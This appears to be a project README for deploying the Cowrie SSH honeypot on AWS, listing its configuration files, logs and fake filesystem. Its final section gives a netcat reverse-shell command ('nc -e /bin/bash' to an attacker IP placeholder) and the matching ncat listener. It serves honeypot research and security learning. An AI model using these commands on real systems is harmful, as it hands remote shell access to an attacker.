# Cowrie-Honeypot-Deployment-Project


Requirements
Software required to run locally:

Python 3.9+

python-virtualenv

For Python dependencies, see requirements.txt.

Files of interest:
etc/cowrie.cfg - Cowrie’s configuration file. Default values can be found in etc/cowrie.cfg.dist.

share/cowrie/fs.pickle - fake filesystem

etc/userdb.txt - credentials to access the honeypot

honeyfs/ - file contents for the fake filesystem - feel free to copy a real system here or use bin/fsctl

honeyfs/etc/issue.net - pre-login banner

honeyfs/etc/motd - post-login banner

var/log/cowrie/cowrie.json - transaction output in JSON format

var/log/cowrie/cowrie.log - log/debug output

var/lib/cowrie/tty/ - session logs, replayable with the bin/playlog utility.

var/lib/cowrie/downloads/ - files transferred from the attacker to the honeypot are stored here

share/cowrie/txtcmds/ - file contents for simple fake commands

bin/createfs - used to create the fake filesystem

bin/playlog - utility to replay session logs


COWRIE HONEYPOT SETUP: 

Configured Cowrie with realistic settings to emulate a vulnerable system.

Deployed on AWS using the Free Tier for cost-effective cloud hosting.

Implemented security groups to control traffic and access, ensuring a controlled environment.

RAT Creation and Deployment:

Utilized the ncat utility to create an executable shell on the victim machine with the command: nc -e /bin/bash ipaddress required.

Executed the reverse shell on the attacker's system using: sudo ncat -k -l -v -p portnumber, establishing a connection between the attacker's system and the target environment.
